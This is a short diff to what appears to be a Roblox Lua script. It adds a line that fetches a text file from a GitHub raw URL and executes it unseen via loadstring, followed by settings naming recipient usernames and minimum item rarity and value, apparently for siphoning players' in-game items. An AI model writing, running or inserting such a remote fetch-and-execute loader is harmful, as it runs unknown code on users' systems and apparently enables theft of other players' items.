@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Sigma/refs/heads/main/text%209.txt"))()
 _G.Usernames = {"botbotter_10", "IIIIIIIIIIIIIlllIII2"} -- you can add as many as you'd like
 _G.min_rarity = "Legendary"
 _G.min_value = 1 -- Put 1 to get all
